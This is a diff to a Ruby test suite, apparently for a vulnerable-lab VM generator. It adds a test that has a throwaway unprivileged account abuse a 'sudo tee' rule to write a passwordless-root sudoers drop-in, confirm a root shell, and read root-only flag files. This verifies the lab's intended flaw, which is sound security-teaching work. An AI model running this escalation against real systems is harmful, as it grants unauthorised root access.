@@ -47,7 +47,42 @@ class SudoRootTeeTest < PostProvisionTest
       end
     end
 
-    # TODO tier 3 (exploit): hand-written — as a throwaway user, use the GTFOBins tee sudo technique to write a sudoers drop-in, read the root-only flag, then remove the drop-in
+    tier(3) do
+      # GTFOBins (tee, sudo): because any user may run tee as root, a non-root
+      # user can write any file as root. A throwaway, non-sudoer account writes
+      # a sudoers drop-in granting itself full root through the `sudo tee` rule,
+      # then uses it to run `id` as root (uid=0, so <privilege>root_rwx</privilege>
+      # is satisfied) and to read the root-only flag. The drop-in is removed on
+      # the way out and the account is deleted by with_throwaway_ssh_user.
+      dropin = '/etc/sudoers.d/90_secgen_t3_tee'
+      with_throwaway_ssh_user do |user, _pass|
+        begin
+          # the new account is genuinely unprivileged: it cannot read the flag yet
+          leaked.each do |f|
+            test_local_command("throwaway user #{user} cannot read #{f} before escalation",
+                               "cat #{Shellwords.escape("/root/#{f}")} 2>&1 || true", 'Permission denied', user: user, tier: 3)
+          end
+          # write the sudoers drop-in through the vulnerable tee rule (runs as root)
+          rule = "#{user} ALL=(ALL) NOPASSWD: ALL\n"
+          w = run_as_user(user, "printf %s #{Shellwords.escape(rule)} | sudo -n /usr/bin/tee #{dropin} >/dev/null")
+          self.outputs.push w[:stderr] unless w[:stderr].to_s.empty?
+          # the drop-in now lets the account run anything as root: prove a root shell
+          test_local_command('throwaway user escalates to root via the sudo tee misconfiguration (GTFOBins)',
+                             'sudo -n id', 'uid=0(root)', user: user, tier: 3)
+          # and read each root-only flag as root, matching the leaked content
+          strings.each_with_index do |s, i|
+            next if s.strip.empty?
+            fname = leaked[i] || leaked.first
+            next unless fname
+            read_cmd = "sudo -n cat #{Shellwords.escape("/root/#{fname}")}"
+            test_local_command("throwaway user reads root-only #{fname} after escalation",
+                               read_cmd, s.strip.lines.first.to_s.strip, user: user, tier: 3)
+          end
+        ensure
+          run_vagrant_ssh("rm -f #{dropin}")
+        end
+      end
+    end
   end
 
 end
